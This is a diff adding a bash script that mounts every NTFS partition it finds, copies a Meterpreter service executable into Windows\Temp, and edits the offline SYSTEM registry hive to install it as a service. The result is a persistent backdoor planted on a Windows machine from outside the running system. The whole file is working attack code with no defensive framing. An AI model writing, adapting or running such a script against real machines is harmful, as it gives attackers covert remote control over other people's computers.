@@ -1,0 +1,29 @@
+#!/bin/bash
+
+copy_payload() {
+	echo "Copying payload to windows partition"
+	cp -r meterpreter-service/meterpreter_service.exe /tmp/mnt/Windows/Temp
+}
+
+create_service() {
+	echo "Modifying registry to add service"
+	reged -C -I /tmp/mnt/Windows/System32/config/SYSTEM HKEY_LOCAL_MACHINE\\SYSTEM meterpreter-service/service.reg >/dev/null
+}
+
+
+mkdir -p /tmp/mnt
+
+echo "Looking for NTFS volumes..."
+set -e $(blkid -o list | grep -v "ntfs-3g" | awk '/ntfs/{print $1}')
+while [ ! -z ${1} ]
+do
+	echo "Checking NTFS volume ${1} for windows installation"
+	ntfs-3g ${1} /tmp/mnt
+	if [ -e /tmp/mnt/Windows/Temp ]; then
+		echo "Found windows partition at ${1}"
+		copy_payload
+		create_service
+	fi
+	umount /tmp/mnt
+	shift
+done
